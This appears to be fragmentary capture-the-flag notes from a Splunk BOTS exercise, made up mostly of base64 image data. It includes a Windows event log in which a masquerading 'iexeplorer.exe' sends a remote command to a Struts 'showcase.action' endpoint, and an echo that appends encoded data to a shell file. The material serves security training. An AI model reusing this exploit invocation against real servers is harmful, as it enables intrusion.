JxQApoAhnxtzQBVzQBJC+1xQBac/IT7UgKue9MBM+1AEsDYcUgJ5uUz6UAVjQAhOKAETJPA60wLeSy/dGfY0gKtwCr80ANQ4oAehxnNAD9y4AoAQsCfwoAYSaAAGgAoAsFtsI9cUAUz1oAQDJAoAmWAlck80gIWXDEUDIieaAFoAQRs/TI+lAD2g2xcHmgCqyEdeaAGbcUARsKAGN9KQxmcnGKBnzx+1v/AMyp/wBvf/tGmiWfU1sflNUIsA0gA0AQ3HamBXxQAq9eKALvVMH0pAVG44NACYoAlgGXHtQBb6jFAETRjPFADZYxt+lAEA4HBpgTRoCCSwU+9ICOVfmIzn3FACRpuOB1oAlEJoAPKNACNGVGaAIyKABRk4oAk8o0AJPwFHtQBXNAwU4YH0NIRdVsqCKAKlwcucUDIMnPSgC3HGABnk0AS/hQA08igCrPGGB28GgDPZsdaAG5BoAaxoGRkikM+d/2tj/yKv8A29/+0aaJZ//ZCk15IE15ISBZb3UgYXJlIHZlcnkgY3VyaW91cyBwZXJzb24gYXJlbid0IHlvdS4gWW91IGFyZSBiYWQgcGVyc29uLiBObyBvbmUgbGlrZXMgYSBub3NleSBwZXJzb24uLiBleGNlcHQgZm9yIHVzISBJZiB0aGlzIGlzIGEgQk9UUyBhdCAuY29uZjE4IHBlcnNvbi4uLiBjb25ncmF0cyEgUmFpc2UgeW91ciBoYW5kIGFuZCB0ZWxsIHRoZSBwcm9jdG9ycyEgWW91IGp1c3Qgd29uIGEgdmVyeSBuaWNlIHByaXplLiBJZiB5b3VhcmUgYXQgYSByZWd1bGFyIEJPVFMuIFNPIFNPUlJZLi4gS2luZCBvZj4gVGVsbCB5b3VyIHByb2N0b3IgYW5kIHNlZSBpZiB0aGVyZSBpcyBhbnl0aGluZyBmb3IgeW91ICNibGFtZWJyb2Rza3kuIElmIHlvdSBhcmUgc2FkIHRoaXMgcGhvdG8gaXMgYmFkLCBzb3JyeS4gRnlvZG9yIGJhZCBhdCBwaG90b3MuIEl0IGlzIHBvdGF0byBwaG9uZQo= >> /tmp/definitelydontinvestigatethisfile.sh"
Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

definitelydontinvestigatethisfile.sh

using cyberchef an image from splunk

and the other

Creator Process ID:	0x28ec
	Creator Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
	Process Command Line:	"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "echo 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